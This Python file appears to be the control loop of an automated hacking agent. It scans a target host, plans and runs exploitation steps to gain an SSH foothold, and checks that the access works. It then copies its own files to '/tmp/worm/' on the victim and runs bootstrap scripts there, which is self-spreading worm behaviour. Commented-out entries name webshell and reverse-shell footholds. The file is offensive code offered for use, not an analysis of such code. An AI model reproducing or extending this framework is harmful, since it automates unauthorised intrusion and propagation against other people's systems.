from analysis import analyze
from planner import plan_next_actions
from executor import execute_action, run
from tool_normalizer import normalize_tool_output
from hypothesizer import generate_hypotheses
from progress import assess_progress
from memory import Campaign, Host
from reflector import evaluate_action_progress
from verify_foothold import verify_foothold
import tools
from tools.registry import REGISTRY
import networkx as nx

FOOTHOLD_EXEC_MAP = {
    "ssh_key": "ssh_exec",
    "ssh_key_drop": "ssh_exec",
    # "webshell": "curl_webshell_exec",
    # "reverse_shell": "shell_session_exec",
}

def select_exec_tools(host):
    if not host.foothold:
        return []
    name = FOOTHOLD_EXEC_MAP.get(host.foothold.get("type"))
    return [REGISTRY[name]] if name and name in REGISTRY else []

test_host = Host(
    id="host1",
    services={},
    facts={},
    state="unknown",
    os=None,
    hostname=None,
    hypotheses=[],
    ip = "127.1.2.3",
    foothold=False,
    vulnerabilities={},
)

# Define memory
campaign = Campaign(
    graph=nx.DiGraph(),
    hosts=[test_host],
)

# Discover network
pass

# Enumerate host code
phase = "enum_host"

def merge(dst, src):
    for k, v in src.items():
        if (
            k in dst
            and isinstance(dst[k], dict)
            and isinstance(v, dict)
        ):
            merge(dst[k], v)
        else:
            dst[k] = v

def apply_update(host, update):
    merge(host.facts, update.get("facts", {}))
    for edge in update.get("new_edges", []):
        if "from" not in edge or "to" not in edge:
            continue
        campaign.graph.add_edge(edge["from"], edge["to"], type=edge.get("type", ""))
    if "vulnerabilities" in update:
        merge(host.vulnerabilities, update["vulnerabilities"])

def upload_to_host(host, local_path, remote_path):
    tool = REGISTRY["ssh_put"]
    f = host.foothold["details"]
    argv = tool.build_command({
        "target_ip": host.ip,
        "user": f["user"],
        "key_path": f["local_key_path"],
        "local_path": local_path,
        "remote_path": remote_path,
        "remote_os": "windows" if host.os == "windows" else "unix",
    })
    return run(argv, timeout=180)

COMMANDS = {
    "windows": ["./bootstrap.cmd"],
    "linux": ["./bootstrap.sh"],
    "mac": ["./bootstrap.sh"],
}

def detect_os(exec_fn) -> str:
    r = exec_fn("uname -s")
    if r["code"] == 0:
        out = r["stdout"].strip()
        if out == "Darwin":
            return "mac"
        if out == "Linux":
            return "linux"
    r = exec_fn("echo %OS%")
    if "Windows_NT" in r["stdout"]:
        return "windows"
    return "unknown"

def make_exec_fn(host):
    tool = REGISTRY["ssh_exec"]
    f = host.foothold["details"]
    def exec_fn(command):
        argv = tool.build_command({
            "target_ip": host.ip,
            "user": f["user"],
            "key_path": f["local_key_path"],
            "command": command,
        })
        return run(argv, timeout=30)
    return exec_fn

def run_hardcoded(host):
    if not host.foothold:
        print("[-] No verified foothold; nothing to run.")
        return
    exec_fn = make_exec_fn(host)
    host.os = detect_os(exec_fn)
    print(f"[*] Detected OS: {host.os}")
    for c in COMMANDS.get(host.os, COMMANDS["linux"]):
        r = exec_fn(c)
        print(f"$ {c}  (exit {r['code']})\n{r['stdout']}{r['stderr']}")

# Get basic facts of the host
for host in campaign.hosts:
    progress = {"progress": "more_info_needed"}
    while progress["progress"] != "ready":
        analysis_result = analyze(host, campaign.graph)
        host.facts.update(analysis_result["facts"])

        plan = plan_next_actions(host, analysis_result["inferences"],
                                analysis_result["signals"], None, None,
                                [t for t in REGISTRY.values() if t.category == "recon"], phase)
        print("Got plan:", plan)

        actions_queue = list(plan.get("Next Actions", []))
        normalized_result = None

        while actions_queue:
            step = actions_queue.pop(0)
            tool = REGISTRY[step["tool"]]

            execution_info, raw = execute_action(step["action"], tool, host)
            
            if execution_info["ok"]:
                normalized_result = normalize_tool_output(tool, execution_info["result"], host, phase)
                apply_update(host, normalized_result)
            else:
                normalized_result = {"error": execution_info.get("error", "unknown failure")}

            reflection = evaluate_action_progress(host, normalized_result, actions_queue, phase)
            print(f"Reflector Decision: {reflection['decision']} - {reflection['reason']}")

            if reflection["decision"] == "replan":
                break
                
            elif reflection["decision"] == "hypothesize":
                break
                
            elif reflection["decision"] == "modify_and_continue":
                if "modified_next_action" in reflection and actions_queue:
                    print(f"Modifying next action: {reflection['modified_next_action']}")
                    actions_queue[0] = reflection["modified_next_action"]
                
            elif reflection["decision"] == "continue":
                pass

        if normalized_result:
            new_hypotheses = generate_hypotheses(host, normalized_result)
            host.hypotheses.extend(new_hypotheses.hypotheses)
        progress = assess_progress(host.hypotheses, analysis_result["unknowns"], None, phase)

    phase = "establish_foothold"
    progress = {"progress": "not_established"}
    
    while progress["progress"] != "established":
        analysis_result = analyze(host, campaign.graph)
        hypotheses = [h for h in host.hypotheses if h.confidence > 0.7 and not h.failed_attempts]
        
        if not hypotheses:
            break

        for hypothesis in hypotheses:
            plan = plan_next_actions(host, analysis_result["inferences"], analysis_result["signals"],
                                    analysis_result["unknowns"], hypothesis, [t for t in REGISTRY.values() if t.category == "foothold"], phase)

            action_queue = list(plan.get("Next Actions", []))
            hypothesis_failed = False
            
            while action_queue:
                step = action_queue.pop(0)
                tool = REGISTRY[step["tool"]]

                execution_info, raw = execute_action(step["action"], tool, host)
                
                if execution_info["ok"]:
                    normalized_result = normalize_tool_output(tool, execution_info["result"], host, phase)
                    apply_update(host, normalized_result)
                else:
                    normalized_result = {"error": execution_info.get("error", "unknown failure")}
                
                claims = normalized_result.get("foothold_claims", [])

                if claims:
                    foothold_verified = False
                    for claim in claims:
                        host.foothold = claim 
                        
                        if verify_foothold(host):
                            progress = {"progress": "established"}
                            foothold_verified = True
                            break
                        else:
                            print(f"[-] Claim ({claim['type']}) failed verification.")
                    
                    if foothold_verified:
                        break
                    else:
                        host.foothold = None
                        reflection = {"decision": "replan", "reason": "Exploit output claimed access, but verification failed (false positive)."} 
                else:
                    reflection = evaluate_action_progress(host, normalized_result, action_queue, phase)
                if reflection["decision"] == "replan":
                    break
                elif reflection["decision"] == "attempt_verify":
                    if verify_foothold(host):
                        progress = {"progress": "established"}
                        break
                    else:
                        hypothesis_failed = True
                        break
                        
                elif reflection["decision"] == "abandon_hypothesis":
                    hypothesis.failed_attempts = True
                    hypothesis_failed = True
                    break
                    
                elif reflection["decision"] == "modify_and_continue":
                    if "modified_next_action" in reflection and action_queue:
                        action_queue[0] = reflection["modified_next_action"]
                elif reflection["decision"] == "continue":
                    pass
            
            if progress["progress"] == "established":
                break

    if host.foothold:
        upload_to_host(host, ".", "/tmp/worm/")
        run_hardcoded(host)